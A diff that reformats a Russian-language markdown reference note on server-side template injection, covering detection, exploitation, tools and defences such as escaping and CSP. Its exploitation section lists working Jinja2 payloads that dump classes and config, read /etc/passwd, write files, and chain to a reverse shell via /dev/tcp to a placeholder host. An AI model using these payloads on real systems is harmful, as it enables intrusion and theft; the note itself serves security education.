@@ -1,10 +1,8 @@
-﻿# уязвимость/атака
-
+# уязвимость/атака
 
 ## Описание
 SSTI (server side template injection) - внедрение шаблонов на стороне сервера.
 Механизмы шаблонов широко используются веб-приложениями для представления динамических данных через веб-страницы и электронные письма. Небезопасное встраивание пользовательского ввода в шаблоны позволяет внедрить шаблон на стороне сервера. Template Injection можно использовать для прямой атаки на внутренние компоненты веб-серверов и получения удаленного выполнения кода (RCE), превращая каждое уязвимое приложение в потенциальную опорную точку.
-
 
 ## Классификация
 
@@ -23,13 +21,14 @@ Client-side / Server-side Template Injection
 
 
 Для детектирования можно использовать tplmap и ручное тестирование путем ввода различных шаблонов, например:
-{{ 7*7 }}
-{{ 7 * ‘7’ }}
+`{{  7*7  }}`
+
+`{{ 7 * '7'}}`
 и т.д. 
 Выполнение кода, введенного в шаблоне, сигнализирует о наличии данной  уязвимости.
 
 
-Информация:
+##Информация:
 
 
 https://portswigger.net/blog/server-side-template-injection
@@ -40,56 +39,74 @@ https://defcon.ru/web-security/3840/
 
 
 
+
 ## Эксплуатация
 
 
-Дамп всех используемых классов (Dump all used classes)
+###Дамп всех используемых классов (Dump all used classes)
 
 
-{{ [].class.base.subclasses() }}
-{{''.class.mro()[1].subclasses()}}
-{{ ''.__class__.__mro__[2].__subclasses__() }}
+`{{ [].class.base.subclasses() }}`
 
-Дамп всех переменных конфигурации (Dump all config variables)
+`{{''.class.mro()[1].subclasses()}}`
 
+`{{''.__class__.__mro__[2].__subclasses__()}}`
 
-{% for key, value in config.iteritems() %}
-    <dt>{{ key|e }}</dt>
-    <dd>{{ value|e }}</dd>
-{% endfor %}
-
-Чтение из удаленных файлов (Reading remote files)
+###Дамп всех переменных конфигурации (Dump all config variables)
 
 
-# ''.__class__.__mro__[2].__subclasses__()[40] = File class
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+	{% for key, value in config.iteritems() %}
+			<dt>{{ key|e }}</dt>
+   		<dd>{{ value|e }}</dd>
+	{% endfor %}
+
+###Чтение из удаленных файлов (Reading remote files)
 
 
+`''.__class__.__mro__[2].__subclasses__()[40] = File class`
 
-Запись в удаленные файлы (Writing into remote files)
+`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`
 
-
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+`{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}`
 
 
 
-Удаленное выполнение кода (RCE)
+###Запись в удаленные файлы (Writing into remote files)
+`{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt',`
 
-
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
-{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+`'w').write('Hello here !') }}`
 
 
 
-### Инструменты
+###Удаленное выполнение кода (RCE)
 
 
-Tplmap - это инструмент от @epinna, который помогает эксплуатировать уязвимость SSTI с помощью ряда методов выхода из песочницы, чтобы получить доступ к базовой операционной системе. Он может использовать несколько контекстов кода и сценариев слепого внедрения. Github
+`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from`
+
+`subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config`
+
+`{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config`
+
+`{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to`
+
+`evil host`
 
 
-search.py скрипт от DoubleSigma. Link.
+
+
+
+
+
+
+
+
+## Инструменты
+
+
+Tplmap - это инструмент от [epinna](https://github.com/epinna), который помогает эксплуатировать уязвимость SSTI с помощью ряда методов выхода из песочницы, чтобы получить доступ к базовой операционной системе. Он может использовать несколько контекстов кода и сценариев слепого внедрения. [Github](https://github.com/epinna/tplmap)
+
+
+search.py скрипт от DoubleSigma. [Link](https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py).
 
 
 ## Ущерб
@@ -105,12 +122,17 @@ search.py скрипт от DoubleSigma. Link.
 Экранирование - технически реализация экранирования заключается в замене определенных символов их безопасными аналогами - html-кодами. Как правило, считаются опасными и подлежат замене 5 символов - это кавычки, знаки больше/меньше и амперсанд, то есть `&`, `<`, `>`, `"`, `'` 
 
 
- & --> &amp;
- < --> &lt;
- > --> &gt;
- " --> &quot;
- ' --> &#x27;   ( &apos;  не рекомендуется)
- / --> &#x2F; 
+`& --> &amp;`
+ 
+` < --> &lt;`
+
+` > --> &gt;`
+
+` " --> &quot;`
+
+` ' --> &#x27;   ( &apos;  не рекомендуется)`
+
+` / --> &#x2F; `
 
 
 Политика защиты контента (CSP) - в качестве последней линии защиты вы можете использовать Content Security Policy (CSP), чтобы уменьшить серьезность любых уязвимостей XSS, которые все еще возникают.
